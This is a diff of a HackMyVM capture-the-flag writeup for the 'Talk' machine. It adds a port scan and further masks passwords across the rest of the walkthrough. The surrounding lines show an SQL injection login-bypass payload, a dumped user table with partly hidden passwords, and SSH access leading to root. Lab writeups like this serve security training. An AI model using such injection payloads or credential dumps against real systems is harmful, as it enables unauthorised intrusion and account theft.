@@ -1,5 +1,13 @@
 # Talk - HackMyVM, writeup
 
+## Port scan
+```console
+┌──(alienum㉿kali)-[~]
+└─$ nmap 10.0.2.179   
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
 ## Login sql injection
 ```console
 Username : admin' or '1'='1'-- -
@@ -36,7 +44,7 @@ Table: user
 | userid | email           | phone       | password        | username | your_name |
 +--------+-----------------+-------------+-----------------+----------+-----------+
 | 5      | david@david.com | 11          | adrian*******   | david    | david     |
-| 4      | jerry@jerry.com | 111         | thatsmy******** | jerry    | jerry     |
+| 4      | jerry@jerry.com | 111         | thatsm********* | jerry    | jerry     |
 | 2      | nona@nona.com   | 1111        | myfriend***     | nona     | nona      |
 | 1      | pao@yahoo.com   | 09123123123 | pao             | pao      | PaoPao    |
 | 3      | tina@tina.com   | 11111       | david********   | tina     | tina      |
@@ -60,13 +68,13 @@ nona: :(
 - The hacker shuffle the passwords 
 #### Correct username & password matching
 ```
-nona  : thatsmy********
+nona  : thatsm*********
 ```
 ## SSH as nona
 ```console
 ┌──(alienum㉿kali)-[~]
 └─$ ssh nona@10.0.2.179                                    
-nona@10.0.2.179's password: thatsmy********
+nona@10.0.2.179's password: thatsm*********
 nona@talk:~$ ls
 flag.sh  user.txt
 nona@talk:~$
@@ -94,4 +102,4 @@ root@talk:~# ls
 flag.sh  root.txt
 root@talk:~#
 ```
-## Thanks sML for these new type of machines (Speed and Talk)
+## Thanks sML
